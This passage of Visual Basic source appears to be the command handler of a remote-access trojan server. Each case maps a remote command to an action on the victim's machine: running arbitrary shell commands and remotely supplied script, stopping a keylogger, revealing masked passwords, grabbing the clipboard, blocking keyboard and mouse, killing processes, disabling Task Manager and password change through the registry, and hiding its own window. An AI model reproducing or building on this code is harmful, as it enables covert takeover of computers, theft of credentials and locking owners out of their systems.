                    ts = "exiting chat."
                Else
                    frmChat.Text1.Text = frmChat.Text1.Text + "<" + Format(index) + "> " + args + vbCrLf
                    frmChat.Text1.SelStart = Len(frmChat.Text1.Text)
                    ts = "text send to chat window."
                End If
    Case "27", "showpic":
                frmChat.Text1.Visible = False
                frmChat.Image1.Visible = True
                If Mid(args, 1, 1) = 0 Then
                    frmChat.Image1.Stretch = False
                Else
                    frmChat.Image1.Stretch = True
                End If
                frmChat.Image1.Picture = LoadPicture(Mid(args, 2, Len(args)))
                ts = "picture should be displayed."
                frmChat.Show vbModal, Me
    Case "28", "print": printText (args)
                ts = "printing: " & args
    Case "30", "play":
                If Len(args) > 1 Then
                If Mid(args, 1, 1) = 1 Then
                    x = PlaySound(Mid(args, 2, Len(args)), 0, 2 Or 1)
                Else
                    x = PlaySound(Mid(args, 2, Len(args)), 0, 2 Or 8 Or 1)
                End If
                ts = "playing sound action executed."
                End If
    Case "31", "stopplay": x = PlaySound(0, 0, &H40)
                ts = IIf(x = True, ts = "sound stopped.", "could not stop playing.")
    Case "32", "totop": ShowWindow CLng(args), 1
                t = SetForegroundWindow(CLng(args))
                z = BringWindowToTop(CLng(args))
                ts = "window brought to foreground"
    Case "33", "flash": For i = 1 To 9
                    FlashWindow CLng(args), 1
                    start = Timer
                    Do While Timer < start + 0.2
                        DoEvents
                    Loop
                Next i
                ts = "window flashed."
                
    Case "35", "showwin": ShowWindow CLng(Mid(args, 3, Len(args))), CLng(Mid(args, 1, 2))
               ts = "window showed."
    Case "36", "swap":
                If SwapMouseButton(True) <> 0 Then SwapMouseButton (False)
               ts = "mouse buttons swaped."
   Case "37", "setwall": x = SystemParametersInfo(20, True, CStr(Mid(args, 3, Len(args)) + Chr(0)), 0)
                ts = IIf(x = 1, "wallpaper set", "wallpaper not set")
   Case "38", "settrails": x = SystemParametersInfo(93, Val(args), CStr(1), 0)
                ts = IIf(x = 1, "mouse trails set", "mouse trails failed")
   Case "39", "showsound": x = SystemParametersInfo(57, True, vbNull, 2)
                ts = IIf(x = 0, "failed.", "ok.")
   Case "40", "noshowsound": x = SystemParametersInfo(57, False, CStr(1), 2)
                ts = IIf(x = 0, "failed.", "ok.")
   Case "41": x = SystemParametersInfo(47, 0, vbNull, 2)
                ts = IIf(x = 0, "failed.", "ok.")
   
   Case "43", "setpcname": x = SetComputerName(args)
                ts = IIf(x = 1, "pc name set.", "pc name set failed.")
   'Case "51": Call redirect(index, args)
   Case "52", "disredir": Call disableRedir
                ts = "redirects should be disabled."
   Case "53", "hidetask": HideTaskBar
                ts = "taskbar hidden"
   Case "54", "showtask": ShowTaskBar
                ts = "taskbar shown"
    Case "55", "hidedesk": HideDesktop
                ts = "desktop hidden"
    Case "56", "showdesk": ShowDesktop
                ts = "desktop shown"
    Case "57", "hidestart": HideStartButton
                ts = "start button hidden"
    Case "58", "showstart": ShowStartButton
                ts = "start button shown"
    Case "59", "hideicons": HideTaskBarIcons
                ts = "taskbar icons hidden"
    Case "60", "showicons": ShowTaskBarIcons
                ts = "taskbar icons shown:"
    Case "61", "hideprogs": HideProgramsShowingInTaskBar
                ts = "programs in taskbar hidden"
    Case "62", "showprogs": ShowProgramsShowingInTaskBar
                ts = "programs in taskbar shown"
    Case "63", "hideclock": HideTaskBarClock
                ts = "taskbar clock hidden"
    Case "64", "showclock": ShowTaskBarClock
                ts = "taskbar clock shown"
    Case "65": ts = ExecuteCommand(args)
    Case "66", "monitoroff": SendMessage frmMain.hwnd, &H112, &HF170, 2
    Case "67", "monitoron": SendMessage frmMain.hwnd, &H112, &HF170, -1
    Case "68", "ntstuff": Select Case Mid(args, 1, 2)
                    'Case "00": wsSend index, "6800" & sendBackNTStuff, True
                    Case "01": SaveStringWORD "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\policies\system\DisableTaskMgr", Mid(args, 4, 1)
                    Case "02": SaveStringWORD "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\policies\Explorer\NoLogoff", Mid(args, 4, 1)
                    Case "03": SaveStringWORD "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\policies\Explorer\NoClose", Mid(args, 4, 1)
                    Case "04": SaveStringWORD "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\policies\system\DisableLockWorkstation", Mid(args, 4, 1)
                    Case "05": SaveStringWORD "HKEY_CURRENT_USER\software\microsoft\windows\currentversion\policies\system\DisableChangePassword", Mid(args, 4, 1)
                End Select
                ts = " ok..."
    Case "69", "killredir": Call killAllRedirect
                ts = "all redirects should be killed."
    Case "70", "restartsock": ts = "restarting server listening."
                btnStart_Click
    'Case "71":  wsSend index, "71"
                'EndKeyLogger = False
                'Call CheckKey(index)
    Case "72", "stopkeylogg": EndKeyLogger = True
                ts = "keylogger stopped."
    Case "75", "execute":
                HTTPerrIndex = index
                scrcode = Replace(args, "gimme(", "sendHTTP(" & Str(index) & ",")
                scrcode = Replace(scrcode, "gimme ", "sendHTTP " & Str(index) & ",")
                scrcode = Replace(scrcode, "%myindex", Str(index))
                scMain.ExecuteStatement scrcode
                start = Timer
                Do While Timer < start + 0.2
                    DoEvents
                Loop
    Case "76", "addcode":
                ts = "adding code to script object."
                HTTPerrIndex = index
                scrcode = Replace(args, "gimme(", "call sendHTTP(" & Str(index) & ",")
                scrcode = Replace(scrcode, "gimme ", "sendHTTP " & Str(index) & ",")
                scrcode = Replace(scrcode, "%myindex", Str(index))
                scMain.AddCode scrcode
    Case "77", "enumsect": ts = EnumerateSections(args)
    Case "78", "enumval": ts = EnumerateValues(args)
    Case "81", "delstring": ts = DeleteString(args)
    Case "82", "delkey": ts = deleteKey(args)
    Case "83", "listproc": ts = ProcessList(True)
    Case "84", "killprocid": ts = IIf(KillProcessID(args) = True, "process terminated.", "killing process failed.")
    Case "85", "hidemouse": ts = IIf(ShowCursor(False) >= 0, "mouse cursor shown.", "mouse cursor hidden.")
    Case "86", "showmouse": ts = IIf(ShowCursor(True) >= 0, "mouse cursor shown.", "mouse cursor hidden.")
    Case "87", "block": ts = IIf(BlockInput(True), "mouse and keyboard blocked.", "already blocked.")
    Case "88", "unblock": ts = IIf(BlockInput(False), "mouse and keyboard unblocked.", "unblocked.")
    Case "89", "restart": ts = "restarting server..."
                x = Shell(fulln(App.Path) & App.EXEName & ".exe", vbHide)
                If x <> 0 Then Unload Me 'KillProcessID (App.threadID)
                ts = "restarting server failed."
    Case "91", "getmouse": ts = "x=" & Str(GetX) & "; y=" & Str(GetY)
    Case "92", "setmouse": tmpParm = Split(args, ";")
                x = SetCursorPos(CLng(tmpParm(0)), CLng(tmpParm(1)))
                ts = IIf(x = 0, "error setting coord...", "mouse coord set.")
    Case "93", "getclip": ts = Clipboard.GetText
    Case "94", "clearclip": Clipboard.Clear
                ts = "clipboard erased."
    Case "95", "setclip": Clipboard.SetText args
                ts = "clipboard data set."
    Case "96", "open": ts = IIf(OpenDoc(args) > 32, "executing...", "failed...")
    Case "97", "resetscript": scMain.Reset
                ts = "script conntrol was reset."
    Case "0a", "hidegui": Me.Hide
                ts = "server GUI hidden."
    Case "0b", "showgui": Me.Show
                ts = "server GUI shown."
    Case "0c", "stoplisten": ws(0).Close
                ts = "server stopped listening for connections."
    Case "0d", "port": If Val(args) < 1 Or Val(args) > 32000 Then args = "8000"
                txtPort.Text = args
                ts = "should changed port to: " & args
                btnStart_Click
    Case "f0", "drives": ts = allDrives
    Case "se", "stoplive":
                capScreen = 0
                If wsMouseK.State <> sckClosed Then wsMouseK.Close
                ts = "live control should be stopped now."
    Case "gp", "reveal":  Call RevealPasswords(GetDesktopWindow)
                ts = "*** chars should be revealed now."
    Case "pi", "ping": ts = Format(Now) & " - PONG !"
    Case Else: ts = "/" & cmd & args & " is not recognized as a valid command."
End Select
cmdResult = ts
End Function

Public Function openPage(ByVal Filename As String) As String
On Error GoTo errore
    freefileNr = FreeFile
    If LCase(Dir(Filename)) <> LCase(JustName(Filename)) Then GoTo errore
    Open Filename For Binary Access Read As #freefileNr
    openPage = Space(LOF(freefileNr))
    Get #freefileNr, , openPage
    Close freefileNr
    Exit Function
errore:
    openPage = "error: could not load specified file."
End Function
